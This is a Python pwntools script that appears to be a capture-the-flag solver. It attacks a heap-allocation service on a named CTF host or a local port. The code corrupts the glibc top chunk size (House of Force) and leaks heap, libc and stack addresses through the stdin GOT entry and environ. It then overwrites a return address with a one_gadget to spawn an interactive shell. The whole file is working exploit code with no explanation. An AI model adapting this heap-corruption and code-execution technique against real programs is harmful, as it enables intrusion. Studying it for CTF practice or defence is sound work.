from pwn import *

context.arch='amd64'

import sys
if len(sys.argv) == 2:
    if sys.argv[1] == 'local':
        host = '127.0.0.1'
        port = 8888
    if sys.argv[1] == 'csie':
        host = 'csie.ctf.tw'
        port = 10141
else:
    print('Please tell me a server\'s name')
    sys.exit()

r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(new_top, data, old_top, old_top_size):
    nb = new_top - old_top - 0x10
    allocate_heap(nb, data)
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10) % 0x10000000000000000
    return new_top, new_top_size

def overwrite_top_to_ffffs():
    allocate_heap(0x18, b'c'*0x18 + p64(0xffffffffffffffff), False)

# leak top chunk address
allocate_heap(0x28, b'a'*0x28 + p64(0xfd1), False)
allocate_heap(0x1000, b'a')
allocate_heap(0x200, b'a'*0x10, False)
show_heap()
r.recvuntil('a'*0x10)
heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
top = heap + (0x1e14010 - 0x1df2030)
if top < 0x602030: # that means there is a null byte (0x00) inside the address of top chunk
    top += 0x10000000
# print('top =', hex(top))

glibc_stdin_got = 0x602030
glibc_stdin_off = 0x3c48e0
one_gadget_off = 0x45216
environ_off = 0x7f3142bfaf38 - 0x7f3142834000

# leak libc
allocate_heap(0xda0-0x10, b'a') # clean out unsorted bin so that we can modify top address
overwrite_top_to_ffffs()
top = top + 0x20
gen_new_top(glibc_stdin_got - 0x10, b'a', top, 0xfffffffffffffff8)
allocate_heap(0x10, b'a', False)
show_heap()
glibc_stdin = u64(r.recvuntil('\n')[1:-1].ljust(8, b'\x00'))
glibc_stdin = (glibc_stdin & 0xffffffffffffff00) + 0xe0
libc = glibc_stdin - glibc_stdin_off

# calculate addresses
one_gadget = libc + one_gadget_off
environ = libc + environ_off
# print('libc          =', hex(libc))
# print('one_gadget    =', hex(one_gadget))
# print('environ       =', hex(environ))

# leak stack address by environ
overwrite_top_to_ffffs()
gen_new_top(environ - 0x10, b'a', 0x602060, 0xfffffffffffffff8)
allocate_heap(0x10, b'a'*8, False)
show_heap()
r.recvuntil(b'a'*8)
stack = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
allocate_heap_ret = stack + (0x7ffdacf6d138 - 0x7ffdacf6d268)
# print('stack         =', hex(stack))
# print('allocate_heap_ret =', hex(allocate_heap_ret))

# change allocate_heap return address
overwrite_top_to_ffffs()
gen_new_top(allocate_heap_ret-0x8 - 0x10, b'a', environ+0x28, 0xfffffffffffffff8)
allocate_heap(0x18, p64(allocate_heap_ret+0x18) + p64(one_gadget) + p64(0x400770) + p64(0x3c), False)

r.interactive()
